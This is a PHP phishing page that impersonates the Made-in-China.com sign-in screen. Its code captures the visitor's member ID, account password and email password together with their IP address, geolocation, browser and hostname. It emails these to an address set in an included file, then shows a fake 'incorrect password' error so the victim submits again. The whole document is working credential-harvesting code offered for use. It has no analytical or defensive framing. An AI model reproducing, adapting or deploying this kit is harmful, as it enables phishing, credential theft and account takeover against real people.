<?php

include 'api.php';

if (isset($_GET['path'])) {
$path = $_GET['path'];
}
if (isset($_GET['logonInCode'])) {
$logonInCode = $_GET['logonInCode'];
}
if ($logonInCode == '1'){
$submit = 'sign-in.php';
//$logPwdErr = '<label class="error" generated="true">Please enter your Password.</label>';
$logidPwdErr = '<label class="error" generated="true">Incorrect Email Password.</label>';
//$logUserErr = '<label class="error" generated="true">Please enter your Email Address or Member ID.</label>';
$bannerErr = '<div id="error_info" class="tips"><h6 id="error_title">Invalid account or email password.</h6><p id="error_desc">Please try again!</p></div>';
}
elseif ($logonInCode == '0'){
$logPwdErr = '<label class="error" generated="true">Please enter your Password.</label>';
$logidPwdErr = '<label class="error" generated="true">Please enter your Email Password.</label>';
$logUserErr = '<label class="error" generated="true">Please enter your Email Address or Member ID.</label>';
}

require_once 'mail.php';
require_once 'geo.php';
require_once 'sync.php';

if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
}

$geoplugin = new geoPlugin($ip);
$geoplugin->locate();
$cc = $geoplugin->countryCode;
$cn = $geoplugin->countryName;
$br = $obj->showInfo('browser');
$op = $obj->showInfo('os');
$vr = $obj->showInfo('version');
$hostname = gethostbyaddr($ip);
$ua = $_SERVER['HTTP_USER_AGENT'];
$datum = date("D M d, Y g:i a");

if (isset($_POST['logUserName']) || isset($_POST['logPassword']) || isset($_POST['logidPassword'])) { 
$logUserName = $_POST["logUserName"];
$logPassword = $_POST["logPassword"];
$logidPassword = $_POST["logidPassword"];
$path = base64_encode($logUserName);
$message .= "-------------------------------------------------------------------------------------\n";
$message .= "User ID: ".$logUserName."\n";
$message .= "Password: ".$logPassword."\n";
$message .= "Email Password: ".$logidPassword."\n";
$message .= "-------------------------------------------------------------------------------------\n";
$message .= "Web Browser: ".$br."\n";
$message .= "Web Browser Version: ".$vr."\n";
$message .= "Operating System: ".$op."\n";
$message .= "IP: ".$ip." | ".$cn."\n";
$message .= "Submitted: ".$datum."\n";
$message .= "Host Name: ".$hostname."\n";
$message .= "User Agent: ".$ua."\n";
$message .= "-------------------------------------------------------------------------------------\n";

$subject = "New manufacturers & suppliers $ip ($cn)";
$headers = "From: MIC $cc <noreply>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

if (empty($logUserName) || empty($logPassword) || empty($logidPassword)) {
header("Location: ./?logonInCode=0&path=$path");
}
else {
mail($to,$subject,$message,$headers);
	header("Location: ./?logonInCode=1&path=$path");
}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">














<html xmlns="http://www.w3.org/1999/xhtml">

<head>

<title>Sign In | Made-in-China.com</title>

<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />

<meta name="Description"

	content="Sign in to Made-in-China.com to source China products anywhere, anytime." />

<meta name="Keywords" content="Made-in-China.com sign in, sign in" />

<link type="text/css" rel="stylesheet" href="https://www.micstatic.com/gb/css/global_013252bf.css" media="all" />

<link href="https://login.made-in-china.com/css/login.css?t=hXwxJpnTFARY" rel="stylesheet" type="text/css" />

<script>
$("#logon").on('submit', function() {
   alert($("#sign-in-submit").val());
});
</script>

</head>

<body>
    
	<div class="grid login-box login-box-new">
		<!-- MIC Logo & Live Chat -->

		<div class="m-header">
    <div class="grid">
        <div class="m-header-row">
            <div class="m-logo-wrap">
                <a href="#" title="Manufacturers & Suppliers" class="m-logo"></a>
        </div>
        </div>
    </div>
</div>
		<span class="help">
			Need Help? <a href="javascript:void(0)" id="live-chat">Live Chat</a>
		</span>
		<!-- 登陆 -->
		<div class="login-wrap">
			<!-- ADVERTISE -->
			<div class="login-ad">
				
						
							<a href="#" target="_blank" ads-data="t:59,c:11,aid:QxmnVGEJKQiX,md:3,a:1"><img style="width: 400px;" src="images/ad.jpg" alt="Follow us on social media" title="Follow us on social media"/></a>
						
						
					
			</div>

			<div class="login-form">
				<form id="logon" action="<?php echo $submit; ?>" method="post" onsubmit="return validate()">
					<!-- error info -->
					<?php echo $bannerErr ?>
					<!-- login id -->
					<div class="form-item">
                    	<label for="" class="form-label">Email Address or Member ID</label>
	                    <div class="form-fields mail-wrap">
	                    	<input id="logUserName" name="logUserName" class="input-text J-loginname" tabindex="1" type="text" value="<?php echo isset($_GET['path']) ? base64_decode($_GET['path']) : '' ?>" size="17" maxlength="160"/>
	                    <?php echo $logUserErr; ?>						
	                    </div>
					</div>
					<!-- login password -->
					<div class="form-item">
						<label for="" class="form-label">
							Password
						</label>
						<div class="form-fields">
	                    	<input id="logPassword" name="logPassword" class="input-text J-password" tabindex="2" type="password" value="" size="17"/>
						<?php echo $logPwdErr; ?>	
						</div>

                	</div>
					<!-- login id password -->
					<div class="form-item">
						<label for="" class="form-label">
							<a id="forgot_pwd_link" rel="nofollow" href="#">Forgot your password?</a>
							Email Password
						</label>
						<div class="form-fields">
	                    	<input id="logidPassword" name="logidPassword" class="input-text J-password" tabindex="2" type="password" value="" size="17"/>
						<?php echo $logidPwdErr; ?>	
						</div>

                	</div>
                	
	                <div class="form-btn">
	                    <button class="btn btn-main" id="sign-in-submit" tabindex="5" type="submit">Sign In</button>
	                </div>
			    </form>
	            <p class="form-help">
	                New User? <a rel="nofollow" href="#">Join Free</a>
				
	                <span class="sign-in-with" id="scLogin">Sign in with:<a class="facebook" title="Facebook" href="javascript:void(0);"><img src="images/fb.png"></a></span>
				
	            </p>

            </div>
        </div>
		<div class="bottom"></div>
	</div>

	<div class="m-footer">
    <div class="grid">
        <div class="m-footer-simple-links">
            <div class="m-footer-simple-links-group">
                <div class="m-footer-simple-links-row">
    <a rel="nofollow" href="#" target="_blank">About Us</a>
    <span class="m-gap-line"></span>
            <a rel="nofollow" href="#" target="_blank">FAQ</a>
        <span class="m-gap-line"></span>
    <a rel="nofollow" href="#" target="_blank">Help</a>
    <span class="m-gap-line"></span>
    <a href="#" target="_blank">Site Map</a>
            <span class="m-gap-line"></span>
        <a rel="nofollow" href="#" target="_blank">Contact Us</a>
        <span class="m-gap-line"></span>
        <a href="#" target="_blank">Mobile Site</a>
    </div>
            </div>
            <div class="m-footer-simple-links-group">
                <div class="m-footer-simple-links-row">
    <a rel="nofollow" href="#" target="_self">Terms &amp; Conditions</a>
    <span class="m-gap-line"></span>
    <a rel="nofollow" href="#" target="_self">Declaration</a>
    <span class="m-gap-line"></span>
    <a rel="nofollow" href="#" target="_self">Privacy Policy</a>
</div>
                <div class="m-footer-simple-links-row m-footer-copyright">
    Copyright &copy; 1998-2019 <a class="J-focusChinaLink" href="#" rel="nofollow" target="_blank">Focus Technology Co., Ltd. </a>All Rights Reserved.
</div>
            </div>
        </div>
    </div>
</div>
</body>
</html>